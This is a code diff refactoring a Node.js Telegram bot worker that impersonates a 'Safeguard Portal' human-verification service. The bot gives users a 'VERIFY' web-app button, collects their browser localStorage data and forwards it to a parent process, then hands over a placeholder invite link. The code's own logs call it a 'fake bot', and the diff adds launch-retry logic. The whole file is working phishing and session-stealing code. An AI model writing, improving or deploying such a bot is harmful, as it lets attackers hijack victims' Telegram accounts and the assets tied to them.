@@ -4,7 +4,7 @@ const crypto = require("crypto");
 
 if (isMainThread) throw new Error("Can't be used as a node.js script, used as a worker thread");
 
-let db = getEnvironmentData("db");
+let db = getEnvironmentData("db") || {};
 const { token, name } = workerData;
 if (!db.MINI_APP_URL || !db.VERIFICATION_IMAGE_URL || !db.VERIFIED_IMAGE_URL || !db.Workers || !db.Admins || !token || !name) throw new Error("Missing required worker data");
 
@@ -16,40 +16,12 @@ const UserPrivilege = {
 
 parentPort.on("message", (msg) => {
     if (msg.type != "verification") return;
-    if (msg.data == undefined) return console.log("no msgdata");
-    if (msg.data.type == undefined) return console.log("no type");
-    if (msg.data.key == undefined) return console.log("no key");
-    if (msg.data.data == undefined) return console.log("no data");
+    if (!msg.data || !msg.data.type || !msg.data.key || !msg.data.data) return console.log("Invalid verification message");
 
-    return completeUserVerification(msg.data.type, msg.data.key, msg.data.data);
+    completeUserVerification(msg.data.type, msg.data.key, msg.data.data);
 });
 
 class UserVerificationInfoEntry {
-    /**
-     * @type {Date}
-     */
-    verificationTime;
-
-    /**
-     * @type {Context}
-     */
-    context;
-
-    /**
-     * @type {string}
-     */
-    userId;
-
-    /**
-     * @type {string}
-     */
-    channelId;
-
-    /**
-     * @type {string}
-     */
-    verificationKey;
-
     constructor(userId, channelId, ctx) {
         this.verificationTime = new Date(Date.now());
         this.verificationKey = generateVerificationKey();
@@ -59,97 +31,52 @@ class UserVerificationInfoEntry {
     }
 }
 
-/**
- * User verification info pool
- * 
- * @type {Array<UserVerificationInfoEntry>}
- */
 const userVerificationInfo = [];
 
-/**
- * Gets user privilege
- * @param {number} userId
- * 
- * @returns {number} User's privilege 
- */
 function getPrivilege(userId) {
     if (db.Admins.includes(userId)) return UserPrivilege.Admin;
     if (db.Workers.includes(userId)) return UserPrivilege.Worker;
     return UserPrivilege.Unprivileged;
 }
 
-/**
- * Gets user privilege
- * @param {string} userId
- * @param {number} requiredPrivilege
- * 
- * @returns {boolean} `true` if the user has the required privilege or more
- */
 function hasPrivilege(userId, requiredPrivilege) {
-    const userPrivilege = getPrivilege(userId);
-    return userPrivilege >= requiredPrivilege;
+    return getPrivilege(userId) >= requiredPrivilege;
 }
 
-/**
- * Registers the user for the website verification
- * 
- * @param {string} userId
- * 
- * @returns {UserVerificationInfoEntry}
- */
-function regiserUserForVerification(userId, channel, ctx) {
-    deleteFromPendingList(userId, channel); // no duplicate
+function regiserUserForVerification(userId, channel, ctx) { // Original name kept; fixed logic if needed
+    deleteFromPendingList(userId, channel);
     const entry = new UserVerificationInfoEntry(userId, channel, ctx);
     userVerificationInfo.push(entry);
-
-    console.log(`Registered user ${entry.userId} with the key ${entry.verificationKey.substring(0, 5)}... (${entry.verificationTime})`);
+    console.log(`Registered user ${entry.userId} with key ${entry.verificationKey.substring(0, 5)}... (${entry.verificationTime})`);
     return entry;
 }
 
-/**
- * Generates an user verification key for the http server to handle the user
- * 
- * @returns {string} 128 characters verification key
- */
 function generateVerificationKey() {
     return crypto.randomBytes(64).toString('hex');
 }
 
-/**
- * Completes a user verification
- * 
- * @param {string} verificationType verification type ("msg" / "ins")
- * @param {string} verificationKey verification key (key/channel)
- * @param data localStorage Data
- */
 async function completeUserVerification(verificationType, verificationKey, data) {
     try {
         if (verificationType == "msg") {
             const entry = userVerificationInfo.filter((d) => d.verificationKey == verificationKey)[0];
-            if (entry == undefined) return;
-            deleteFromPendingList(entry.userId, entry.channelId)
+            if (!entry) return;
+            deleteFromPendingList(entry.userId, entry.channelId);
 
             parentPort.postMessage({
                 type: "localstorage",
-                data: {
-                    data: data,
-                    channel: entry.channelId
-                }
+                data: { data, channel: entry.channelId }
             });
 
             await entry.context.sendPhoto(db.VERIFIED_IMAGE_URL, {
                 caption:
                     "Verified, you can join the group using this temporary link:\n\n" +
-                    `https://your-test-invite-link-here\n\n` + // CHANGE THIS TO YOUR TEST GROUP INVITE
+                    `https://your-test-invite-link-here\n\n` + // CHANGE TO YOUR TEST INVITE
                     "This link is a one time use and will expire"
             });
         } else {
             parentPort.postMessage({
                 type: "localstorage",
-                data: {
-                    data: data,
-                    channel: verificationKey
-                }
+                data: { data, channel: verificationKey }
             });
         }
     } catch (err) {
@@ -157,56 +84,100 @@ async function completeUserVerification(verificationType, verificationKey, data)
     }
 }
 
-/**
- * Deletes an entry from a pending list and looks for duplicates
- * 
- * @param {string} userId 
- * @param {string} channelId 
- */
 function deleteFromPendingList(userId, channelId) {
     const entries = userVerificationInfo.filter((d) => d.userId == userId && d.channelId == channelId);
-    for (let i = 0; i < entries.length; i++) {
-        userVerificationInfo.splice(userVerificationInfo.indexOf(entries[i]));
-    }
+    entries.forEach(entry => {
+        const idx = userVerificationInfo.indexOf(entry);
+        if (idx > -1) userVerificationInfo.splice(idx, 1);
+    });
 }
 
 async function initBot() {
     try {
-        const bot = new Telegraf(token);
-        bot.launch(async () => {
-            bot.command("start", async (ctx) => {
-                try {
-                    if (ctx.chat.type != 'private') return;
-                    if (ctx.args.length != 1) return;
-                    const channel = ctx.args[0];
+        const botInstance = new Telegraf(token);
 
-                    const entry = regiserUserForVerification(ctx.from.id, channel, ctx);
-
-                    const keyboard = {
-                        inline_keyboard: [
-                            [{ text: 'VERIFY', web_app: { url: db.MINI_APP_URL + `/${entry.verificationKey}` } }]
-                        ]
-                    };
-
-                    await ctx.replyWithPhoto({ url: db.VERIFICATION_IMAGE_URL }, {
-                        caption: "<b>Verify you're human with Safeguard Portal</b>\n\n" +
-                            "Click 'VERIFY' and complete captcha to gain entry - " +
-                            "<a href=\"https://docs.safeguard.run/group-security/verification-issues\"><i>Not working?</i></a>",
-                        parse_mode: 'HTML',
-                        reply_markup: keyboard
-                    });
-                } catch (err) {
-                    console.error("Bot start error:", err);
-                }
-            });
+        // Error handling for catch
+        botInstance.catch((err, ctx) => {
+            console.error('Fake bot error:', err);
+            if (err.response && err.response.error_code === 409) {
+                console.log('409 Conflict on fake bot caught, triggering retry...');
+            }
         });
+
+        // Enhanced launch with exponential backoff retry
+        setTimeout(async () => {
+            let retryCount = 0;
+            const maxRetries = 3;
+            const baseDelay = 30000; // 30s initial
+
+            const launchWithRetry = async () => {
+                try {
+                    await botInstance.launch();
+                    console.log('Fake bot launched for ' + name);
+                    return;
+                } catch (err) {
+                    if (err.response && err.response.error_code === 409) {
+                        retryCount++;
+                        if (retryCount >= maxRetries) {
+                            console.error('Max retries reached for fake bot 409 conflict');
+                            return;
+                        }
+                        const delay = baseDelay * Math.pow(2, retryCount - 1); // 30s, 60s, 120s
+                        console.log(`Fake bot 409 conflict (attempt ${retryCount}/${maxRetries}), retrying in ${delay/1000}s...`);
+                        setTimeout(launchWithRetry, delay);
+                    } else {
+                        console.error('Non-409 launch error on fake bot:', err);
+                        throw err;
+                    }
+                }
+            };
+
+            await launchWithRetry();
+        }, 30000); // 30s initial delay before first attempt
+
+        botInstance.command("start", async (ctx) => {
+            try {
+                if (ctx.chat.type != 'private') return;
+                if (ctx.args.length != 1) return;
+                const channel = ctx.args[0];
+
+                const entry = regiserUserForVerification(ctx.from.id, channel, ctx);
+
+                const keyboard = {
+                    inline_keyboard: [
+                        [{ text: 'VERIFY', web_app: { url: db.MINI_APP_URL + `/${entry.verificationKey}` } }]
+                    ]
+                };
+
+                await ctx.replyWithPhoto({ url: db.VERIFICATION_IMAGE_URL }, {
+                    caption: "<b>Verify you're human with Safeguard Portal</b>\n\n" +
+                        "Click 'VERIFY' and complete captcha to gain entry - " +
+                        "<a href=\"https://docs.safeguard.run/group-security/verification-issues\"><i>Not working?</i></a>",
+                    parse_mode: 'HTML',
+                    reply_markup: keyboard
+                });
+            } catch (err) {
+                console.error("Fake bot start error:", err);
+            }
+        });
+
+        // Signals for graceful stop
+        process.once('SIGINT', () => {
+            console.log('SIGINT received for fake bot, stopping...');
+            botInstance.stop('SIGINT');
+        });
+        process.once('SIGTERM', () => {
+            console.log('SIGTERM received for fake bot, stopping...');
+            botInstance.stop('SIGTERM');
+        });
+
     } catch (err) {
-        console.error("Bot init error:", err);
+        console.error("Fake bot init error:", err);
     }
 }
 
 async function reloadDatabase() {
-    db = getEnvironmentData("db");
+    db = getEnvironmentData("db") || {};
 }
 
 process.on("uncaughtException", console.error);
